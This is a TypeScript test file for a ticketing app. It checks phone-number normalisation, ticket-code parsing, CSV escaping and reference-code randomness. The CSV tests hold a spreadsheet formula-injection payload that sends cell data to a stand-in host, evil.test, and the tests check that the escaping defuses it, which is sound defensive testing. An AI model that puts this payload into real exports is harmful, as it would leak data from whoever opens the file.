import { describe, it, expect } from 'vitest';
import { normaliseNgPhone, formatPhoneForDisplay } from '@/types/ticketing';
import { extractTicketCode } from '@/lib/offline-db';
import { csvField } from '@/lib/api/csv';
import { generateReference } from '@/lib/api/reference';

describe('normaliseNgPhone', () => {
  const cases: Array<[string, string]> = [
    ['08039927805', '+2348039927805'],
    ['0803 992 7805', '+2348039927805'],
    ['+234 803 992 7805', '+2348039927805'],
    ['2348039927805', '+2348039927805'],
    ['8039927805', '+2348039927805'],
    ['(0803)-992-7805', '+2348039927805'],
  ];

  it.each(cases)('normalises %s', (input, expected) => {
    expect(normaliseNgPhone(input)).toBe(expected);
  });

  it('does not invent a valid number out of garbage', () => {
    // The door's identity check is this number. Anything that cannot be
    // read must come out failing the +234########## shape so the API
    // rejects it, rather than being coerced into something plausible.
    const pattern = /^\+234[0-9]{10}$/;
    for (const junk of ['', 'not a phone', '123', '+1 415 555 0100']) {
      expect(pattern.test(normaliseNgPhone(junk))).toBe(false);
    }
  });
});

describe('formatPhoneForDisplay', () => {
  it('groups a normalised number for reading aloud at a door', () => {
    expect(formatPhoneForDisplay('+2348039927805')).toBe('+234 803 992 7805');
  });

  it('passes anything unrecognised through untouched rather than mangling it', () => {
    expect(formatPhoneForDisplay('+1 415 555 0100')).toBe('+1 415 555 0100');
    expect(formatPhoneForDisplay('')).toBe('');
  });
});

describe('extractTicketCode', () => {
  it('accepts a bare code in either case', () => {
    expect(extractTicketCode('SGN-2345-6789')).toBe('SGN-2345-6789');
    expect(extractTicketCode('  sgn-2345-6789 ')).toBe('SGN-2345-6789');
  });

  it('pulls the code out of a full ticket URL', () => {
    expect(extractTicketCode('https://lastdance.tikets.online/ticket/SGN-2345-6789')).toBe(
      'SGN-2345-6789'
    );
  });

  it('pulls the code out of forwarded WhatsApp text', () => {
    expect(
      extractTicketCode('hey use my pass SGN-ABCD-2345 see you there')
    ).toBe('SGN-ABCD-2345');
  });

  it('fails closed on anything that is not a code', () => {
    // A partial entry must not match. The scanner used to do a two-way
    // substring test, so typing "SGN" admitted whoever sat first in the
    // manifest — which at a door is the wrong person.
    for (const junk of ['', 'SGN', 'SGN-234', 'hello', '1234-5678']) {
      expect(extractTicketCode(junk)).toBeNull();
    }
  });

  it('rejects the lookalike characters the alphabet deliberately excludes', () => {
    // The ticket alphabet is [2-9A-HJ-NP-Z]: no 0/O and no 1/I, so a human
    // reading a code aloud at a door cannot produce a different valid one.
    expect(extractTicketCode('SGN-0OI1-2345')).toBeNull();
    expect(extractTicketCode('SGN-OOOO-2345')).toBeNull();
    expect(extractTicketCode('SGN-IIII-2345')).toBeNull();
    // L is not excluded by the ticket-code check constraint, so it must be
    // accepted here — the scanner's parser and the database's CHECK have to
    // agree on the alphabet or valid passes read as NOT FOUND at the door.
    expect(extractTicketCode('SGN-LLLL-2345')).toBe('SGN-LLLL-2345');
  });
});

describe('csvField', () => {
  it('neutralises every formula prefix a spreadsheet will execute', () => {
    for (const prefix of ['=', '+', '-', '@', '\t', '\r']) {
      const out = csvField(`${prefix}HYPERLINK("https://evil.test")`);
      expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
    }
  });

  it('defuses the exfiltration payload this exists to stop', () => {
    const attack = '=HYPERLINK("https://evil.test?d="&A1,"Click")';
    const out = csvField(attack);
    // What matters is the first character of the cell's CONTENT: a leading
    // apostrophe is what makes a spreadsheet treat the rest as text. The
    // payload's own `="` sequences survive inside the string and should —
    // they are inert once the cell is not a formula.
    const content = out.startsWith('"') ? out.slice(1) : out;
    expect(content.startsWith("'")).toBe(true);
    expect(content.startsWith('=')).toBe(false);
  });

  it('quotes and doubles embedded quotes', () => {
    expect(csvField('Ade "The Machine" Bello')).toBe('"Ade ""The Machine"" Bello"');
  });

  it('quotes fields containing commas or newlines', () => {
    expect(csvField('Yaba, Lagos')).toBe('"Yaba, Lagos"');
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
  });

  it('prefixes phone numbers, which is the right outcome twice over', () => {
    // Stops Excel reading +234... as a formula, and stops it mangling the
    // number into scientific notation.
    expect(csvField('+2348039927805')).toBe("'+2348039927805");
  });

  it('leaves ordinary values alone', () => {
    expect(csvField('Ade Bello')).toBe('Ade Bello');
    expect(csvField(3375)).toBe('3375');
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });
});

describe('generateReference', () => {
  it('has the expected shape', () => {
    // Tighter than the ticket-code alphabet on purpose: references also drop
    // L, so this asserts the 31-character set the generator actually uses
    // rather than the 32-character one tickets use.
    expect(generateReference()).toMatch(
      /^LD26-[2-9A-HJKMNP-Z]{7}-[2-9A-HJKMNP-Z]{7}$/
    );
  });

  it('is unguessable enough to be a bearer token', () => {
    // The reference IS the authorisation for /ticket/[reference]. The old
    // comp implementation used Date.now().toString(36), which is walkable.
    const seen = new Set<string>();
    for (let i = 0; i < 5_000; i++) seen.add(generateReference());
    expect(seen.size).toBe(5_000);
  });

  it('draws from the alphabet without modulo bias', () => {
    // 256 is not divisible by 31, so a naive byte % 31 over-selects the
    // first few characters. Rejection sampling should leave the
    // distribution flat; a badly skewed one shows up well outside this band.
    const counts = new Map<string, number>();
    for (let i = 0; i < 20_000; i++) {
      for (const ch of generateReference().slice(5).replace('-', '')) {
        counts.set(ch, (counts.get(ch) ?? 0) + 1);
      }
    }
    const frequencies = [...counts.values()];
    const expected = (20_000 * 14) / 31;
    expect(counts.size).toBe(31);
    expect(Math.min(...frequencies)).toBeGreaterThan(expected * 0.9);
    expect(Math.max(...frequencies)).toBeLessThan(expected * 1.1);
  });
});
